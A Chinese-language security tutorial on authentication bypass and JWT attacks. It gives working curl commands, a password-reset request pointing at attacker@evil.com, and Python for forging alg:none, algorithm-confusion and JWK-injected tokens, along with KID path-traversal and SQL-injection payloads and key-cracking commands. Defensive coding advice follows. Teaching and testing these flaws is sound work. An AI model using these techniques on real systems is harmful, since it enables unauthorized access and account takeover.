# 认证绕过与JWT攻击

## 概述

认证机制是Web应用的第一道防线。认证绕过允许攻击者未经有效凭据即可访问受保护资源，而JWT（JSON Web Token）攻击则针对无状态认证协议的实现缺陷进行利用。现代Web应用广泛使用JWT进行API认证和会话管理，但错误配置和实现缺陷导致大量安全漏洞。

## 认证绕过技术

### 直接页面访问

认证控制仅在前端实现时，可通过直接URL访问绕过：

```bash
# 直接访问管理页面
curl -v http://target.com/admin/
curl -v http://target.com/admin/dashboard

# 跳过登录页面
curl -v http://target.com/admin/index.php

# 访问备份管理入口
curl -v http://target.com/admin_backup/
```

### 参数篡改

通过修改请求参数绕过认证检查：

```bash
# HTTP方法篡改
GET /admin/panel → 403 Forbidden
POST /admin/panel → 200 OK（未验证POST方法）

# 参数增删
# 原始：/user/info?id=123
# 绕过：/user/info?id=123&admin=true
# 绕过：/user/info?id=123&role=admin

# 数组参数绕过
# PHP弱类型处理
/verify.php?user_id[]=admin → 绕过类型检查
```

### 会话固定攻击

攻击者先获取有效Session ID，诱骗受害者使用该Session进行登录：

```bash
# 步骤1：攻击者获取Session ID
curl -v http://target.com/login  # Set-Cookie: PHPSESSID=ABC123

# 步骤2：诱骗受害者使用此Session ID
<a href="http://target.com/login?PHPSESSID=ABC123">点击登录</a>

# 步骤3：受害者登录后，攻击者使用同一Session ID
curl -v http://target.com/profile -H "Cookie: PHPSESSID=ABC123"
```

### 密码重置绕过

```text
# 重置Token在URL中泄露
GET /reset-password?token=abc123def456

# 重置Token可预测（基于时间戳）
def generate_token(email):
    return md5(email + str(int(time.time())))

# 重置链接发送到原邮箱前可修改目标邮箱
POST /forgot-password
{"email": "victim@target.com", "new_email": "attacker@evil.com"}

# 步骤跳过
/reset-password → 直接访问/reset-password?token=xxx
# 跳过邮箱验证步骤
```

## JWT结构详解

JWT由三个Base64URL编码的部分组成，以点号分隔：

```text
# JWT结构
header.payload.signature

# Header示例（类型和签名算法）
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
// {"alg":"RS256","typ":"JWT"}

# Payload示例（声明数据）
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9
// {"sub":"1234567890","name":"John Doe","admin":true}

# Signature（对Header+Payload的签名）
E5F5E5F5E5F5E5F5E5F5E5F5E5F5E5F5E5F5E5F5E5F5E5F5E5F5E5F5E5F5E5F5
```

## JWT攻击技术

### alg:none攻击

将签名算法设置为"none"，使服务器忽略签名验证：

```python
import base64, json

def create_none_jwt(payload):
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    # 不包含签名部分
    return f"{header_b64}.{payload_b64}."

# 使用
jwt = create_none_jwt({"sub": "admin", "admin": True})
print(jwt)
# eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYWRtaW4iLCAiYWRtaW4iOiB0cnVlfQ.
```

### HS256/RS256混淆攻击

当服务端使用RS256（非对称），但通过公钥验证HS256（对称）签名时，攻击者可用公钥作为HS256的密钥签名：

```bash
# 获取公钥（通常暴露在/jwks.json或/.well-known/jwks.json）
curl http://target.com/.well-known/jwks.json

# 使用公钥作为HS256密钥伪造JWT
python3 jwt_tool.py target.com/jwks.json -X hs2rs
```

```python
import jwt

# 获取公钥
public_key = open('public_key.pem').read()

# 使用公钥作为HS256密钥签名
# 漏洞条件：服务器使用RS256验证，但接受alg: HS256
malicious_payload = {
    "sub": "admin",
    "role": "administrator",
    "iat": 1516239022
}

forged_jwt = jwt.encode(
    malicious_payload,
    public_key,
    algorithm="HS256"
)
print(forged_jwt)
```

### JWK注入攻击

攻击者在JWT Header中嵌入恶意JWK（JSON Web Key），使服务器使用攻击者提供的公钥验证签名：

```python
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# 生成攻击者自己的RSA密钥对
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# 构造嵌入恶意JWK的JWT
malicious_header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {  # 嵌入攻击者公钥
        "kty": "RSA",
        "n": "base64url_encode(n)",
        "e": "AQAB"
    }
}

# 使用攻击者私钥签名
forged_jwt = jwt.encode(
    {"sub": "admin", "role": "admin"},
    private_key,
    algorithm="RS256",
    headers=malicious_header
)
```

### KID注入攻击

利用KID（Key ID）参数进行路径遍历或SQL注入：

```python
import jwt

# KID路径遍历（读取文件签名）
kid_header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "/proc/sys/kernel/random/boot_id"  # 使用已知文件内容作为密钥
}

# 读取/dev/null（空密钥）
kid_null_header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "/dev/null"  # 空密钥
}

# KID SQL注入
kid_sqli_header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key1' UNION SELECT 'secret'--"  # SQL注入提取密钥
}
```

### JWT暴力破解

```bash
# 使用jwt_tool爆破HS256 JWT密钥
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.xxx -C -d wordlist.txt

# 使用hashcat爆破JWT
hashcat -m 16500 jwt.txt wordlist.txt

# 使用John
john jwt.txt --wordlist=wordlist.txt
```

## 认证与JWT防御

### 安全JWT实践

```python
# 正确的JWT生成
import jwt
from datetime import datetime, timedelta

def create_secure_jwt(user_id, secret_key):
    payload = {
        "sub": user_id,
        "iat": datetime.utcnow(),           # 签发时间
        "exp": datetime.utcnow() + timedelta(hours=1),  # 过期时间
        "nbf": datetime.utcnow(),           # 生效时间
        "jti": generate_uuid()              # 唯一ID（防重放）
    }
    return jwt.encode(payload, secret_key, algorithm="RS256")

# 正确的JWT验证
def verify_jwt(token, public_key):
    try:
        payload = jwt.decode(
            token,
            public_key,
            algorithms=["RS256"],
            options={
                "verify_exp": True,
                "verify_iat": True,
                "require": ["exp", "iat", "sub"]
            }
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise Exception("Token expired")
    except jwt.InvalidTokenError:
        raise Exception("Invalid token")
```

### JWT防御清单

- **强制使用RS256/ES256**，绝不使用HS256当公钥可获取
- **验证alg头**：显式检查`alg`参数是否在允许列表中
- **拒绝none算法**：检查并拒绝`alg: none`的JWT
- **限制KID来源**：不使用用户输入构造密钥查找路径
- **短暂过期时间**：Token有效期不超过1小时，敏感操作使用短期Token
- **Token轮换**：每次刷新Token时重新签发，废除旧Token
- **黑名单机制**：必要时维护已吊销Token列表（使用redis记录jti）

### 认证通用防御

```python
# 防暴力破解
from flask_limiter import Limiter
limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # 每分钟最多5次尝试
def login():
    # 登录逻辑
    pass
```

- **多因素认证**：增加第二认证因素（TOTP、短信、生物识别）
- **速率限制**：登录、密码重置、API接口实施速率限制
- **异常检测**：基于地理位置、设备指纹、行为模式的异常登录检测
- **安全日志**：记录所有认证事件（登录成功、失败、Token刷新）

## 检测与利用工具

| 工具 | 用途 | 特点 |
|------|------|------|
| jwt_tool | JWT攻击套件 | 支持none/混淆/KID/JWK注入 |
| jwt-cracker | 弱密钥爆破 | 支持字典爆破 |
| PyJWT | JWT库 | 官方Python JWT实现 |
| jsonwebtoken.io | 在线调试 | JWT编解码与调试 |
| Burp JWT Editor | Burp插件 | 可视编辑JWT，支持重放攻击 |

## 参考资源

- [jwt.io](https://jwt.io/) - JWT官方调试器
- [jwt_tool](https://github.com/ticarpi/jwt_tool) - JWT攻击利用工具
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)
